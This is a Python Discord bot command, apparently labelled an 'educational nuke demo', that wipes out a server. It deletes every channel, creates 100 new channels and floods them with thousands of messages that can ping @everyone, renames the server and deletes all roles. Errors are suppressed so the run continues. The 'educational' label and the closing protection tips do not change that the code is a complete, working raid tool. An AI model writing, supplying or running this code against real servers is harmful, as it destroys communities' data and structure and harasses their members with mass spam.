@bot.tree.command(name="raid", description="[OWNER ONLY] Educational nuke demonstration")
async def raid(
    interaction: discord.Interaction,
    message: str = "⚠️ THIS SERVER HAS BEEN NUKED ⚠️",
    ping: str = "yes",
    amount: int = 5000
):
    if interaction.user.id != OWNER_ID:
        return await interaction.response.send_message("❌ Only the bot owner can run this.", ephemeral=True)
    
    if not interaction.guild.me.guild_permissions.administrator:
        return await interaction.response.send_message("❌ Bot needs Administrator permission.", ephemeral=True)
    
    await interaction.response.send_message(f"⚡ **EDUCATIONAL NUKE DEMO STARTING**\nSending {amount} messages...", ephemeral=False)
    
    ping_enabled = ping.lower() in ['yes', 'y', 'true', '1']
    msg_amount = min(amount, 50000)
    ping_text = "@everyone " if ping_enabled else ""
    
    guild = interaction.guild
    active_demo[guild.id] = True
    
    # Create log channel
    log_channel = await guild.create_text_channel("🔴-NUKED-BY-DEMO")
    await log_channel.send("💀 **EDUCATIONAL NUKE DEMO** 💀")
    
    messages_sent = 0
    
    async def spam_channel_fast(channel, msgs_to_send):
        nonlocal messages_sent
        try:
            for i in range(msgs_to_send):
                if not active_demo.get(guild.id):
                    break
                await channel.send(f"{ping_text}{message}")
                messages_sent += 1
        except:
            pass
    
    async def create_and_spam_fast(channel_num):
        try:
            channel = await guild.create_text_channel(f"nuked-{channel_num}")
            msgs_for_channel = msg_amount // 100 + 1
            await spam_channel_fast(channel, msgs_for_channel)
        except:
            pass
    
    try:
        # Delete all channels except log
        await log_channel.send("📢 Deleting all channels...")
        delete_tasks = [channel.delete() for channel in guild.channels if channel != log_channel]
        if delete_tasks:
            await asyncio.gather(*delete_tasks, return_exceptions=True)
        
        await asyncio.sleep(1)
        
        # Create 100 channels and spam
        await log_channel.send(f"📢 Creating 100 channels and spamming {msg_amount} messages...")
        
        CHANNEL_COUNT = 100
        channel_tasks = [create_and_spam_fast(i) for i in range(CHANNEL_COUNT)]
        await asyncio.gather(*channel_tasks, return_exceptions=True)
        
        # Rename server
        await guild.edit(name="🔥 NUKED BY DEMO 🔥")
        
        # Delete roles
        role_tasks = []
        for role in guild.roles:
            if not role.is_default() and not role.managed and role != guild.me.top_role:
                role_tasks.append(role.delete())
        if role_tasks:
            await asyncio.gather(*role_tasks, return_exceptions=True)
        
        await log_channel.send(f"✅ Demo complete! Sent {messages_sent} messages")
        
        # Educational summary
        embed = discord.Embed(
            title="💀 EDUCATIONAL NUKE DEMO COMPLETE 💀",
            description=f"**What just happened:**\n\n"
                       f"🗑️ **ALL channels deleted**\n"
                       f"📁 **100 new channels** created\n"
                       f"📛 **Server renamed**\n"
                       f"👑 **ALL roles deleted**\n"
                       f"💬 **{messages_sent} spam messages** sent\n"
                       f"🔔 **@everyone pings**: {'ON' if ping_enabled else 'OFF'}\n\n"
                       f"**🚨 PROTECT YOUR SERVER:**\n"
                       f"• NEVER give Admin to untrusted bots\n"
                       f"• Use 2FA on admin accounts\n"
                       f"• Set verification level to HIGH\n"
                       f"• Use backup bots (Xenon)",
            color=discord.Color.red()
        )
        await log_channel.send(embed=embed)
        
        # DM owner
        try:
            owner = await bot.fetch_user(OWNER_ID)
            await owner.send(embed=embed)
        except:
            pass
        
    except Exception as e:
        await log_channel.send(f"❌ Error: {e}")
    finally:
        active_demo[guild.id] = False
